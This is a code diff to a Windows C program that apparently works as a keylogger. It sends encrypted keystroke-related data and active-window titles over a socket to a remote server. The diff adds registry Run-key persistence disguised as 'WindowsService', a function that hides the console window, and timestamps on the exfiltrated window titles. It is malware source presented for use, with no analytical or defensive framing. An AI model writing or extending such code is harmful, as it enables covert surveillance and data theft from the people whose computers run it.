@@ -1,8 +1,10 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <stdio.h>
+#include <time.h>  
 #include <stdbool.h>
 #include <winreg.h>
+#include <shlobj.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -10,7 +12,38 @@
 #define SERVER_PORT 8080
 #define RETRY_INTERVAL 10000  // 10 minutes in milliseconds
 #define APP_NAME "WindowsService"
+#define SERVICE_NAME "WindowsService"
 #define ENCRYPTION_KEY "S3cr3tK3y"
+
+void install_persistence() {
+    char path[MAX_PATH];
+    HMODULE hModule = GetModuleHandle(NULL);
+    GetModuleFileName(hModule, path, MAX_PATH);
+
+    // Registry persistence
+    HKEY hKey;
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueEx(hKey, SERVICE_NAME, 0, REG_SZ, (BYTE*)path, strlen(path)+1);
+        RegCloseKey(hKey);
+    }
+}
+
+// Hide the console window completely
+void HideConsoleWindow() {
+    HWND hwnd = GetConsoleWindow();
+    if (hwnd != NULL) {
+        ShowWindow(hwnd, SW_HIDE);
+    }
+}
+
+void GetCurrentTimeString(char *timeStr, int maxLen) {
+    time_t now;
+    time(&now);
+    struct tm tm_info;
+    localtime_s(&tm_info, &now);  // Windows-safe version of localtime()
+    strftime(timeStr, maxLen, "[%H:%M:%S] ", &tm_info);
+}
 
 void encryptData(char *data) {
     int key_len = strlen(ENCRYPTION_KEY);
@@ -65,7 +98,11 @@ void logActiveWindow(SOCKET sock) {
         static char lastWindowTitle[256] = "";
         if (strcmp(lastWindowTitle, windowTitle) != 0) {
             char titleBuffer[512];
-            sprintf(titleBuffer, "\n[Window: %s]\n", windowTitle);
+            char timeStr[32] = {0};
+            
+            // Get timestamp and format message
+            GetCurrentTimeString(timeStr, sizeof(timeStr));
+            sprintf(titleBuffer, "\n%s[Window: %s]\n", timeStr, windowTitle);
             
             // Encrypt and send
             char encrypted_data[512];
@@ -80,17 +117,17 @@ void logActiveWindow(SOCKET sock) {
 }
 
 int main() {
-    // Hide the console window
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    HideConsoleWindow();
     SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);
+    install_persistence();
     SOCKET sock;
     static bool keyState[256] = {0};
 
     while (1) {
-        // Get socket connection with retry
+
         sock = connectWithRetry();
         
-        // Main logging loop
         while (sock != INVALID_SOCKET) {
             logActiveWindow(sock);
 
